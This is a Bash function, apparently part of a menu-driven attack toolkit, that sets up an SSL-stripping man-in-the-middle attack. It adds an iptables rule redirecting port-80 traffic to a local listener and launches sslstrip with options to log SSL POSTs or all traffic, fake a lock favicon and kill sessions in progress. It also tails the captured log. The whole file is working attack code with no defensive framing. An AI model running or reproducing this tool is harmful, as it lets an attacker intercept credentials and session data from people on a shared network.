strip_em--()
{
lst_port=10000 ## Port to listen on
sstrip_log="sstrip_log" ## Log Filename
log_opt="-p" ## Logging option
lck_fav="Yes" ## Favicon Variable
ses_kil="Yes" ## Kill Sessions Variable
ssl_tail="Yes" ## SSLStrip Tail Log

	strip_em_III--()
	{
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $lst_port
	if [[ $lck_fav == "Yes" && $ses_kil == "Yes" ]];then
		Eterm -b black -f white --pause --title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -f -k -l $lst_port & ssl_pid=$!
	elif [[ $lck_fav == "Yes" && $ses_kil == "No" ]];then
		Eterm -b black -f white --pause --title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -f -l $lst_port & ssl_pid=$!
	elif [[ $lck_fav == "No" && $ses_kil == "Yes" ]];then
		Eterm -b black -f white --pause --title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -k -l $lst_port & ssl_pid=$!
	else
		Eterm -b black -f white --pause --title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -l $lst_port & ssl_pid=$!
	fi

	sleep 5
	case $ssl_tail in
		Yes) Eterm -b black -f white --pause --title "SSLStrip Tail $(pwd)/$sstrip_log" -e tail -f $sstrip_log & ;;
	esac

	atk_menu--
	}

	strip_em_II--()
	{
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             --SSLStrip Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Listening Port             [$out$lst_port$inp]

2) Log Name                   [$out$sstrip_log$inp]

3) Logging Style              [$out$log_opt$inp]

4) Substituted Lock Favicon   [$out$lck_fav$inp]

5) Kill Sessions in Progress  [$out$ses_kil$inp]

6) Tail SSLStrip Log          [$out$ssl_tail$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) echo -e "$inp\nDefine Listening Port"
		read lst_port
		if [[ $lst_port -lt 1 || $lst_port -gt 65535 ]];then
			lst_port=
			echo -e "$wrn\nPort Not Valid"
			sleep 1
		fi

		strip_em_II--;;

		2) echo -e "$inp\nDefine Log Name"
		read sstrip_log
		strip_em_II--;;

		3) echo -e "$hdr\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             --Define Logging Options--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Log only SSL POSTs (default)

2) Log all SSL traffic TO and FROM server

3) Log all SSL and HTTP traffic TO and FROM server$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
		read log_opt
		case $log_opt in
			1) log_opt="-p" ;;
			2) log_opt="-s" ;;
			3) log_opt="-a" ;;
 			*) log_opt= ;;
		esac

		strip_em_II--;;

		4) echo -e "$inp\nFake a Favicon? (y or n)"
		read lck_fav
		case $lck_fav in
			y|Y) lck_fav="Yes" ;;
			n|N) lck_fav="No" ;;
			*) lck_fav= ;;
		esac

		strip_em_II--;;

		5) echo -e "$inp\nKill Present Sessions? (y or n)"
		read ses_kil
		case $ses_kil in
			y|Y) ses_kil="Yes" ;;
			n|N) ses_kil="No" ;;
			*) ses_kil= ;;
		esac

		strip_em_II--;;

		6) echo -e "$inp\nCreate a Tail of the SSLStrip Log? (y or n)"
		read ssl_tail
		case $ssl_tail in
			y|Y) ssl_tail="Yes" ;;
			n|N) ssl_tail="No" ;;
			*) ssl_tail= ;;
		esac

		strip_em_II--;;

		c|C) if [[ -z $lst_port || -z $sstrip_log || -z $log_opt || -z $lck_fav || -z $ses_kil || -z $ssl_tail ]];then
			echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			strip_em_II--
		else
			fcheck--
			strip_em_III--
		fi;;

		p|P) atk_menu--;;

		m|M) main_menu--;;

		*) strip_em_II--;;
	esac
	}

strip_em_II--
}
